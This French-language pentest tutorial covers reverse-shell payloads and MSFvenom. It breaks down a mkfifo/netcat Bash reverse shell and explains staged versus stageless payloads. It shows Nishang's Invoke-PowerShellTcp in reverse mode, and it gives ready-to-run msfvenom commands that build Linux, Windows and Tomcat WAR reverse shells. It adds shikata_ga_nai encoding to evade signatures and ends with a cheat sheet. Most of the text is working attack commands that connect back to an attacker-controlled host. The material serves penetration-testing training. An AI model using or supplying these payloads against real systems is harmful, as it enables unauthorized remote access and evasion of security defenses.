# Payloads et MSFvenom

## Pourquoi

Un payload est le code qui s'execute sur la cible apres exploitation d'une vulnerabilite. C'est lui qui transforme une faille en acces. Savoir decomposer un payload, comprendre son fonctionnement et en generer un adapte au contexte est une competence critique. MSFvenom, l'outil de generation de payloads de Metasploit, permet de creer des charges utiles personnalisees pour pratiquement toutes les plateformes.

## Comment ca marche

### Decomposition d'un one-liner Bash

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP_CIBLE> 7777 > /tmp/f
```

| Partie | Role |
|---|---|
| `rm -f /tmp/f` | Supprime le pipe s'il existe deja |
| `mkfifo /tmp/f` | Cree un pipe nomme (FIFO) |
| `cat /tmp/f \| /bin/bash -i` | Lit le pipe et envoie le contenu vers Bash en mode interactif |
| `2>&1` | Redirige les erreurs vers la sortie standard |
| `nc IP PORT > /tmp/f` | Connecte Netcat au listener et renvoie les commandes dans le pipe |

### Staged vs stageless

| Type | Fonctionnement | Avantage | Inconvenient |
|---|---|---|---|
| **Staged** | Un petit stager s'execute d'abord, puis telecharge le payload complet | Taille initiale reduite, compatible avec plus d'exploits | Plus de trafic reseau, moins stable en reseau lent |
| **Stageless** | Le payload complet est envoye en une fois | Moins de trafic, plus stable | Taille plus importante |

**Convention de nommage MSFvenom :**
- `linux/x86/shell/reverse_tcp` (slash entre shell et reverse) = **staged**
- `linux/x86/shell_reverse_tcp` (underscore) = **stageless**

### Nishang : Invoke-PowerShellTcp

Le projet Nishang fournit des scripts PowerShell offensifs, dont `Invoke-PowerShellTcp` qui supporte les modes bind et reverse :

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress <IP_CIBLE> -Port 4444
```

## En pratique

### Lister les payloads disponibles

```bash
msfvenom -l payloads
```

### Generer un payload stageless (Linux ELF)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP_CIBLE> LPORT=443 -f elf > implant.elf
```

| Option | Role |
|---|---|
| `-p` | Payload a utiliser |
| `LHOST` | IP de l'attaquant |
| `LPORT` | Port d'ecoute |
| `-f elf` | Format de sortie (ELF pour Linux) |

### Generer un payload Windows (exe)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_CIBLE> LPORT=4444 -f exe -o payload.exe
```

### Encodage pour evasion

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_CIBLE> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload_encoded.exe
```

L'encodeur `shikata_ga_nai` applique un XOR polymorphe en 5 iterations. Cela ne garantit pas l'evasion face aux EDR modernes, mais peut contourner les signatures basiques.

### Formats de sortie courants

| Format | Usage |
|---|---|
| `elf` | Executable Linux |
| `exe` | Executable Windows |
| `dll` | Bibliotheque dynamique Windows |
| `war` | Archive web pour Tomcat (JSP) |
| `raw` | Shellcode brut |
| `ps1` | Script PowerShell |
| `msi` | Installeur Windows |

## Pieges et galeres

- Un payload staged necessite un handler Metasploit (`exploit/multi/handler`) pour recevoir la connexion et envoyer le second stage. Un simple listener Netcat ne suffit pas.
- Les payloads generes par MSFvenom sont tres connus des EDR. En environnement securise, il faut les personnaliser ou utiliser des outils alternatifs (Mythic, Sliver, Havoc).
- Toujours verifier l'architecture de la cible (x86 vs x64) avant de generer le payload.
- Le format du payload doit correspondre a ce que la cible peut executer. Un .elf sur Windows ne fonctionnera pas.

## Retour terrain

MSFvenom est l'outil de reference pour generer rapidement des payloads en lab ou en engagement. En mission reelle, les payloads standards sont detectes. L'objectif est de comprendre la mecanique (stager, shellcode, formats) pour pouvoir ensuite utiliser des outils plus avances ou personnaliser ses charges.

## Memo express

| Besoin | Commande |
|---|---|
| Lister les payloads | `msfvenom -l payloads` |
| Reverse shell Linux | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > fichier` |
| Reverse shell Windows | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o fichier` |
| WAR pour Tomcat | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war` |
| Encodage | Ajouter `-e x86/shikata_ga_nai -i N` |

***
